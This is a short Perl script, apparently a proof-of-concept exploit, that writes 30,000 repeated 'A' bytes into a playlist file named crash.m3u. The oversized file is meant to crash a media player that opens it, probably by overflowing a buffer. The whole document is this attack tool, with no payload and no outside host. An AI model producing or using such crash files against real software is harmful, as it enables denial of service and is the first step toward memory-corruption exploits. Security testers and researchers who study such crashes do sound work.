#!/usr/bin/env perl

my $file= "crash.m3u";
my $junk= "\x41" x 30000;
open($FILE,">$file");
print $FILE "$junk";
close($FILE);
print "m3u File Created successfully\n";
